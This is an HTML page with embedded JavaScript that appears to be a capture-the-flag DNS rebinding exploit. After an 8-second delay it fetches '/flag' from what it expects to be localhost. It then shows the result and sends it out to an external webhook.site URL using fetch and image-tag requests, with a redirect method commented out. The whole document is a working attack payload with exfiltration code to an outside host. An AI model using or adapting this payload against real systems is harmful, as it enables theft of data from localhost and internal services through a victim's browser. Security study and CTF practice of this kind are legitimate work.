<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DNS Rebinding Attack</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0d1117;
            color: #c9d1d9;
            padding: 40px;
            text-align: center;
        }
        h1 { color: #58a6ff; }
        pre {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 20px;
            text-align: left;
            display: inline-block;
            color: #3fb950;
        }
        .processing { color: #d29922; }
        .error { color: #f85149; }
    </style>
</head>
<body>
    <h1 class="processing">‚è≥ DNS Rebinding in Progress...</h1>
    <p class="processing">Waiting for DNS to rebind to localhost...</p>
    
    <script>
        console.log('[*] DNS Rebinding Attack Started');
        console.log('[*] Waiting for DNS TTL to expire and rebind...');
        
        // Wait for DNS to rebind to 127.0.0.1 (typical TTL is 0-5 seconds)
        setTimeout(async () => {
            console.log('[*] Attempting to fetch /flag from localhost...');
            
            try {
                // After DNS rebinds, this will fetch from 127.0.0.1
                const response = await fetch('/flag', {
                    method: 'GET',
                    cache: 'no-cache'
                });
                
                console.log('[+] Response received!');
                const flag = await response.text();
                console.log('[+] Flag:', flag);
                
                // Display the flag
                document.body.innerHTML = `
                    <h1 style="color: #3fb950;">üéâ FLAG CAPTURED!</h1>
                    <pre>${flag}</pre>
                    <p style="color: #8b949e;">Flag extracted via DNS Rebinding</p>
                `;
                
                // EXFILTRATION METHODS:
                
                // Method 1: Fetch to webhook (replace YOUR-ID with actual webhook.site ID)
                try {
                    const webhookUrl = 'https://webhook.site/YOUR-UNIQUE-ID';
                    await fetch(webhookUrl + '?flag=' + encodeURIComponent(flag), {
                        mode: 'no-cors'
                    });
                    console.log('[+] Flag sent to webhook');
                } catch (e) {
                    console.log('[-] Webhook exfiltration failed:', e);
                }
                
                // Method 2: Image tag exfiltration (works even with CORS)
                try {
                    const img = new Image();
                    img.src = 'https://webhook.site/YOUR-UNIQUE-ID/img?flag=' + encodeURIComponent(flag);
                    console.log('[+] Flag sent via image tag');
                } catch (e) {
                    console.log('[-] Image exfiltration failed:', e);
                }
                
                // Method 3: Redirect (visible in browser history)
                setTimeout(() => {
                    try {
                        // Uncomment to use:
                        // location.href = 'https://webhook.site/YOUR-UNIQUE-ID/redirect?flag=' + encodeURIComponent(flag);
                    } catch (e) {
                        console.log('[-] Redirect exfiltration failed:', e);
                    }
                }, 1000);
                
            } catch (error) {
                console.error('[-] Error fetching flag:', error);
                document.body.innerHTML = `
                    <h1 class="error">‚ùå Error</h1>
                    <pre class="error">${error.toString()}</pre>
                    <p>DNS may not have rebound yet, or flag is not accessible</p>
                `;
            }
        }, 8000); // Wait 8 seconds for DNS rebind - adjust if needed
        
        // Heartbeat to show script is running
        let dots = 0;
        setInterval(() => {
            dots = (dots + 1) % 4;
            const loadingText = 'Waiting for DNS rebind' + '.'.repeat(dots);
            const el = document.querySelector('.processing');
            if (el) el.textContent = loadingText;
        }, 500);
    </script>
</body>
</html>
